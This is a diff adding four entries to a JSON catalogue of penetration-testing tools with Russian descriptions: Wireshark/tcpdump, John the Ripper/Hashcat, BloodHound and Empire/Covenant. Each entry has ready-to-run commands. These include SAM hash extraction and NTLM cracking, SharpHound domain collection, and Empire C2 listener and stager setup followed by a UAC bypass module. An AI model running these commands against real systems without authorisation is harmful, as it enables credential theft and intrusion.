@@ -385,5 +385,127 @@
     "phases": ["Reconnaissance"],
     "skill_level": "Intermediate",
     "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-013",
+    "name": "Wireshark / tcpdump",
+    "type": "network_analysis",
+    "description": "Инструменты анализа сетевого трафика для перехвата и анализа пакетов",
+    "url": "https://www.wireshark.org/",
+    "applicable_attack_types": ["man_in_the_middle", "reconnaissance"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Захват трафика на интерфейсе (tcpdump)",
+        "tcpdump -i eth0 -w capture.pcap",
+        "",
+        "# Фильтр по хосту и порту",
+        "tcpdump -i eth0 host <TARGET_IP> and port 445 -w smb_traffic.pcap",
+        "",
+        "# Захват HTTP трафика в текстовом виде",
+        "tcpdump -i eth0 -A port 80",
+        "",
+        "# Анализ захваченного трафика в Wireshark",
+        "wireshark capture.pcap"
+      ]
+    },
+    "phases": ["Reconnaissance"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-014",
+    "name": "John the Ripper / Hashcat",
+    "type": "password_cracking",
+    "description": "Инструменты для взлома паролей через brute force и словарные атаки",
+    "url": "https://www.openwall.com/john/",
+    "applicable_attack_types": ["brute_force", "credential_dumping"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# John the Ripper - взлом NTLM хешей",
+        "john --format=NT hashes.txt",
+        "",
+        "# С использованием словаря",
+        "john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
+        "",
+        "# Hashcat - GPU-ускоренный взлом",
+        "hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
+        "",
+        "# Hashcat с маской (брутфорс)",
+        "hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a",
+        "",
+        "# Извлечение хешей из SAM файла (Windows)",
+        "samdump2 SYSTEM SAM > hashes.txt"
+      ]
+    },
+    "phases": ["Post-Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-015",
+    "name": "BloodHound",
+    "type": "reconnaissance",
+    "description": "Инструмент для анализа Active Directory и поиска путей повышения привилегий",
+    "url": "https://github.com/BloodHoundAD/BloodHound",
+    "applicable_attack_types": ["privilege_escalation"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Сбор данных для BloodHound (SharpHound)",
+        "# На целевой машине Windows:",
+        "SharpHound.exe -c All -d <DOMAIN>",
+        "",
+        "# Импорт данных в BloodHound",
+        "# Запустить neo4j и bloodhound-gui",
+        "sudo neo4j start",
+        "bloodhound",
+        "",
+        "# Анализ путей атаки в GUI",
+        "# 1. Загрузить JSON файлы",
+        "# 2. Найти кратчайшие пути к Domain Admins",
+        "# 3. Анализировать уязвимости Kerberos delegation"
+      ]
+    },
+    "phases": ["Reconnaissance", "Post-Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Windows", "Linux"]
+  },
+  {
+    "id": "TOOL-016",
+    "name": "Empire / Covenant",
+    "type": "post_exploitation",
+    "description": "C2 (Command and Control) фреймворки для пост-эксплуатации",
+    "url": "https://github.com/EmpireProject/Empire",
+    "applicable_attack_types": ["remote_code_execution", "privilege_escalation"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Empire - запуск сервера",
+        "cd /opt/Empire",
+        "./empire",
+        "",
+        "# Создание listener",
+        "(Empire) > listeners",
+        "(Empire) > uselistener http",
+        "(Empire) > set Name http_listener",
+        "(Empire) > execute",
+        "",
+        "# Создание payload (stager)",
+        "(Empire) > usestager windows/launcher_bat",
+        "(Empire) > set Listener http_listener",
+        "(Empire) > execute",
+        "",
+        "# Работа с агентом после получения доступа",
+        "(Empire) > agents",
+        "(Empire) > interact <AGENT_NAME>",
+        "(Empire: <AGENT_NAME>) > shell whoami",
+        "(Empire: <AGENT_NAME>) > usemodule privesc/bypassuac"
+      ]
+    },
+    "phases": ["Exploitation", "Post-Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Linux"]
   }
 ]
